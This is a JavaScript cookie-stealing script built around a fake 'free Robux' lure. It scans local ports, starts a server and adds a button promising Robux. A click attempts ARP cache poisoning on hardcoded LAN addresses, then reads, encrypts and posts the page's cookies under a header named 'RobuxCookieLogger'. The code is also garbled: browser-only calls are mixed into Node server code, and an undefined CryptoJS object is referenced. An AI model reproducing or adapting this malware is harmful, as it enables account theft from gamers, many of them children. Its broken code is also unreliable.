:

import { v4 as uuidv4 } from 'uuid';
import { AES, mode, pad } from 'crypto-js';
import express from 'express';
import arp from 'node-arp';
import WebSocket from 'ws';

const SERVER_BASE = 'http://127.0.0.1:';
const SERVER_PATH = '/Limited-Time-Robux.com/getfreerobux';
const ENCRYPTION_KEY = uuidv4();

function log(message, level = 'info') {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [${level.toUpperCase()}]: ${message}`);
}

async function findOpenPort() {
    let openPort = null;
    for (let port = 3000; port <= 3100; port++) {
        try {
            const ws = new WebSocket(`ws://localhost:${port}`);
            ws.onerror = function() {};
            await new Promise((resolve, reject) => {
                ws.onopen = () => {
                    openPort = port;
                    ws.close();
                    resolve();
                };
                ws.onerror = () => reject(`Port ${port} is closed or inaccessible`);
            });
            if (openPort) break;
        } catch (e) {
            log(`Error scanning port ${port}: ${e}`, 'error');
        }
    }
    return openPort;
}

function extractCookies() {
    try {
        const cookies = document.cookie.split(';').map((cookie) => {
            const parts = cookie.split('=');
            return encodeURIComponent(parts[0].trim()) + '=' + encodeURIComponent(parts[1].trim());
        }).join('&');
        log('Cookies extracted successfully');
        return cookies;
    } catch (error) {
        log(`Error extracting cookies: ${error}`, 'error');
        return '';
    }
}

function encryptData(data) {
    try {
        const encryptedData = AES.encrypt(data, ENCRYPTION_KEY, {
            mode: mode.ECB,
            padding: pad.Pkcs7,
        });
        log('Data encrypted successfully');
        return encryptedData.toString();
    } catch (error) {
        log(`Error encrypting data: ${error}`, 'error');
        throw new Error('Encryption failed');
    }
}

function decryptData(data) {
    try {
        const decryptedData = AES.decrypt(data, ENCRYPTION_KEY, {
            mode: mode.ECB,
            padding: pad.Pkcs7,
        });
        log('Data decrypted successfully');
        return decryptedData.toString(CryptoJS.enc.Utf8);
    } catch (error) {
        log(`Error decrypting data: ${error}`, 'error');
        throw new Error('Decryption failed');
    }
}

async function arpPoisoning(targetIP, spoofedIP) {
    log(`Attempting ARP cache poisoning... Target: ${targetIP}, Spoofed IP: ${spoofedIP}`);
    try {
        await arp.sendArp(spoofedIP, targetIP, '00:11:22:33:44:55', '00:66:77:88:99:00');
        log('ARP cache poisoning successful');
    } catch (error) {
        log(`Error during ARP cache poisoning: ${error}`, 'error');
    }
}

async function cookiePoisoning(openPort) {
    const cookies = extractCookies();
    if (!cookies) {
        log('No cookies to transmit', 'warning');
        return;
    }
    const encryptedCookies = encryptData(cookies);

    const headers = new Headers({
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Stealth-Header': 'RobuxCookieLogger',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
    });

    const requestOptions = {
        method: 'POST',
        headers: headers,
        body: `cookies=${encodeURIComponent(encryptedCookies)}`,
        mode: 'cors',
        cache: 'no-cache',
        redirect: 'follow',
        referrerPolicy: 'no-referrer-when-downgrade',
        credentials: 'omit',
    };

    try {
        const response = await fetch(SERVER_BASE + openPort + SERVER_PATH, requestOptions);
        if (response.ok) {
            log('Cookies successfully transmitted to the server.');
            const responseData = await response.text();
            log('Response data received:', 'info');
            log(responseData);
        } else {
            log(`Transmission failed: ${response.statusText}`, 'error');
        }
    } catch (error) {
        log(`Error during cookie transmission: ${error}`, 'error');
    }
}

function createButton(openPort) {
    const button = document.createElement('button');
    button.innerText = 'Click Repeatedly For 2 Robux Per Click';
    button.style = 'font-size: 20px; padding: 10px; margin: 20px; background-color: #4CAF50; color: white;';
    button.onclick = () => {
        const targetIP = '192.168.1.100';
        const spoofedIP = '192.168.1.1';
        arpPoisoning(targetIP, spoofedIP);
        cookiePoisoning(openPort);
    };
    document.body.appendChild(button);
}

async function startServer(openPort) {
    const app = express();
    app.use(express.urlencoded({ extended: true }));
    app.use(express.json());

    app.post(SERVER_PATH, (req, res) => {
        const encryptedCookies = req.body.cookies;
        try {
            const decryptedCookies = decryptData(encryptedCookies);
            log('Received cookies:', 'info');
            log(decryptedCookies);
            res.send('Cookies received successfully!');
        } catch (error) {
            log(`Error processing cookies: ${error}`, 'error');
            res.status(500).send('Internal Server Error');
        }
    });

    app.listen(openPort, () => {
        log(`Fake web server started on port ${openPort}`);
        createButton(openPort);
    });
}

(async function () {
    const openPort = await findOpenPort();
    if (openPort) {
        log(`Open port found: ${openPort}`);
        await startServer(openPort);
    } else {
        log('No open ports found.', 'warning');
    }
})();

